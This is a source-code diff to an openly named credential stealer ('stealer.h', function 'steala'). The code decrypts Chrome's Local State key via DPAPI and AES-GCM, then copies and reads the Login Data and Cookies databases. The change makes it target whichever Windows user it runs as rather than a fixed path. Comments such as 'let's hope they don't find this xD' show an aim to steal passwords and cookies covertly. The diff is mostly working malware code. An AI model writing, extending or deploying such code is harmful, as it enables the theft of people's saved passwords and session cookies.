@@ -1,4 +1,5 @@
 #include "stealer.h"
+#include "Lmcons.h"
 /* steps to decrypt passwords
     1) Open \User Data\Local states and get encrypted_key which is Base64 encoded
     2) now after decoding it in Base64, we'll get the key encrypted using DPAPI (CryptUnprotectData)
@@ -11,6 +12,7 @@
 */
 
 static std::string resultStr;
+
 
 void putInResult(char* arrayUno, char* arrayDos){
     size_t i = 0;
@@ -156,7 +158,12 @@ std::string steala(void){
         return resultStr;
     }
     /* Parse encrypted_key, Base64 decode, DPAPI decrypt */
-    string localStatePath = "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
+    char user[UNLEN+1];
+    DWORD user_length = UNLEN+1;
+    GetUserNameA(user, &user_length);
+    //printf("%s",user);
+    string temp = user;
+    string localStatePath = "C:\\Users\\"+temp+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
     DWORD base64_encodedkey_size;
     parseObjectFromJson(localStatePath, "encrypted_key", NULL, &base64_encodedkey_size);
     if(base64_encodedkey_size == -1337){
@@ -205,17 +212,20 @@ std::string steala(void){
     AESGCM* aesgcm = new AESGCM(decrypted_data); 
 
     //copy sql database to temporary location
-    string str1 = "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
-    string str2 = "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
-    if(copyContentToFile(str1, "C:\\Users\\User\\Desktop\\testing") != 0){
+    string full_string1 = "C:\\Users\\"+temp+"\\Desktop\\testing";
+
+    string str1 = "C:\\Users\\"+temp+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+    string str2 = "C:\\Users\\"+temp+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
+    if(copyContentToFile(str1, full_string1) != 0){
         wprintf(L"Encountered error copying SQL DB, exiting immedimately\n");
         return "NOPE";
     }
     //read from login data
     sqlite3 *chromeDB, *chromeCookies;
+
     int result;
     char *zErrMsg = 0;
-    result = sqlite3_open("C:\\Users\\User\\Desktop\\testing", &chromeDB);
+    result = sqlite3_open(full_string1.c_str(), &chromeDB);
     if(result){
         wprintf(L"Can't open database: %s\n", sqlite3_errmsg(chromeDB));
         sqlite3_close(chromeDB);
@@ -230,16 +240,17 @@ std::string steala(void){
     }
     sqlite3_close(chromeDB);
 
-    if(deleteFile("C:\\Users\\User\\Desktop\\testing") != 0){
+    if(deleteFile(full_string1.c_str()) != 0){
         wprintf(L"Encountered error deleting temp file, let's hope they don't find this xD\n");
     }
 
     //read from cookies
-    if(copyContentToFile(str2, "C:\\Users\\User\\Desktop\\testing2") != 0){
+    string full_string2 = "C:\\Users\\"+temp+"\\Desktop\\testing2";
+    if(copyContentToFile(str2, full_string2) != 0){
         wprintf(L"Encountered error copying SQL DB, exiting immedimately\n");
         return "NOPE";
     }
-    result = sqlite3_open("C:\\Users\\User\\Desktop\\testing2", &chromeCookies);
+    result = sqlite3_open(full_string2.c_str(), &chromeCookies);
     if(result){
         wprintf(L"Can't open database: %s\n", sqlite3_errmsg(chromeCookies));
         sqlite3_close(chromeCookies);
@@ -254,7 +265,7 @@ std::string steala(void){
     }
     sqlite3_close(chromeCookies);
 
-    if(deleteFile("C:\\Users\\User\\Desktop\\testing2") != 0){
+    if(deleteFile(full_string2.c_str()) != 0){
         wprintf(L"Encountered error deleting temp file, let's hope they don't find this xD\n");
     }
 
